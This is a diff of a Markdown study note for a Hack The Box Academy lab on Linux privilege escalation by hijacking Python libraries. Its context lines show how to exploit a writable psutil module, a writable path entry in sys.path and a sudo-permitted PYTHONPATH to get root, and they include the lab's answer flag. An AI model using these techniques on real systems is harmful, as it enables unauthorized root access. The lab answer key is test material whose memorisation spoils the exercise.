@@ -12,7 +12,7 @@ One or another python module may have write permissions set for all users by mis
 
 ### Checking Privileges
 
-```sh
+```shellsession
 $ sudo -l
 
 Matching Defaults entries for htb-student on lpenix:
@@ -26,7 +26,7 @@ By analyzing this output, we understand that we can execute `/home/htb-student/m
 
 Let's quickly analyze the permissions of the `mem_status.py` Python file.
 
-```sh
+```shellsession
 $ ls -l mem_status.py
 
 -rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
@@ -49,7 +49,7 @@ This script is quite simple and only shows the available virtual memory in perce
 
 So we can look for this function in the folder of `psutil` and check if this module has write permissions for us.
 
-```sh
+```shellsession
 $ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
 
 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
@@ -70,7 +70,7 @@ Such permissions are most common in developer environments where many developers
 
 This is the part in the library where we can insert our code. It is recommended to put it right at the beginning of the function. There we can insert everything we consider correct and effective. 
 
-```sh
+```shellsession
 ...SNIP...
 
 def virtual_memory():
@@ -92,7 +92,7 @@ def virtual_memory():
 
 Now we can run the script with `sudo` and check if we get the desired result.
 
-```sh
+```shellsession
 $ sudo /usr/bin/python3 ./mem_status.py
 
 uid=0(root) gid=0(root) groups=0(root)
@@ -105,7 +105,7 @@ In Python, each version has a specified order in which libraries (modules) are s
 
 ### PYTHONPATH Listing
 
-```sh
+```shellsession
 $ python3 -c 'import sys; print("\n".join(sys.path))'
 
 /usr/lib/python38.zip
@@ -124,7 +124,7 @@ Therefore, if the imported module is located in a path lower on the list and a h
 
 ### Psutil Default Installation Location
 
-```sh
+```shellsession
 $ pip3 show psutil
 
 ...SNIP...
@@ -137,7 +137,7 @@ From this example, we can see that psutil is installed in the following path: `/
 
 ### Misconfigured Directory Permissions
 
-```sh
+```shellsession
 $ ls -la /usr/lib/python3.8
 
 total 4916
@@ -160,7 +160,7 @@ def virtual_memory():
 
 In order to get to this point, we need to create a file called `psutil.py` containing the contents listed above in the previously mentioned directory. It is very important that we make sure that the module we create has the same name as the import as well as have the same function with the correct number of arguments passed to it as the function we are intending to hijack. 
 
-```sh
+```shellsession
 $ sudo /usr/bin/python3 mem_status.py
 
 uid=0(root) gid=0(root) groups=0(root)
@@ -175,7 +175,7 @@ AttributeError: 'NoneType' object has no attribute 'available'
 
 ### Checking Sudo Privileges
 
-```sh
+```shellsession
 $ sudo -l 
 
 Matching Defaults entries for htb-student on ACADEMY-LPENIX:
@@ -189,7 +189,7 @@ As we can see from the example, we are allowed to run `/usr/bin/python3` under t
 
 ### Privilege Escalation via PYTHONPATH Environment Variable Hijacking
 
-```sh
+```shellsession
 $ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
 
 uid=0(root) gid=0(root) groups=0(root)
@@ -203,7 +203,7 @@ SSH to 10.129.205.114 (ACADEMY-LLPE-PYHIJACK), with user `htb-student` and passw
 1. Follow along with the examples in this section to escalate privileges. Try to practice hijacking python libraries through the various methods discussed. Submit the contents of flag.txt under the root user as the answer. **Answer: HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}**
    - Check sudo privileges → we have `sudo` privilege to execute `/usr/bin/python3 /home/htb-student/mem_status.py` as `root`:
    - Check on the script, it is importing `psutil` and uses psutil.virtual_memory():
-        ```sh
+        ```shellsession
         $ cat /home/htb-student/mem_status.py
         #!/usr/bin/env python3
         import psutil 
@@ -213,7 +213,7 @@ SSH to 10.129.205.114 (ACADEMY-LLPE-PYHIJACK), with user `htb-student` and passw
         print(f"Available memory: {round(available_memory, 2)}%")
         ```
    - Check if `psutil` is misconfigured to allow write access:
-        ```sh
+        ```shellsession
         $ pip3 show psutil
         Name: psutil
         Version: 5.9.5
@@ -237,7 +237,7 @@ SSH to 10.129.205.114 (ACADEMY-LLPE-PYHIJACK), with user `htb-student` and passw
         -rw-r--r-- 1 htb-student staff 87706 Jun 30 15:45 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
         ```
    - Since we have write access to `/usr/local/lib/python3.8/dist-packages/psutil/__init__.py`, we can edit the virtual_memory() function to execute our desired command to read the flag as root:
-        ```sh
+        ```shellsession
         ...SNIP...
 
         def virtual_memory():
@@ -257,7 +257,7 @@ SSH to 10.129.205.114 (ACADEMY-LLPE-PYHIJACK), with user `htb-student` and passw
         ...SNIP...
         ```
    - Running the script as sudo to achieve LPE:
-        ```sh
+        ```shellsession
         $ sudo /usr/bin/python3 /home/htb-student/mem_status.py
         HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
         HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
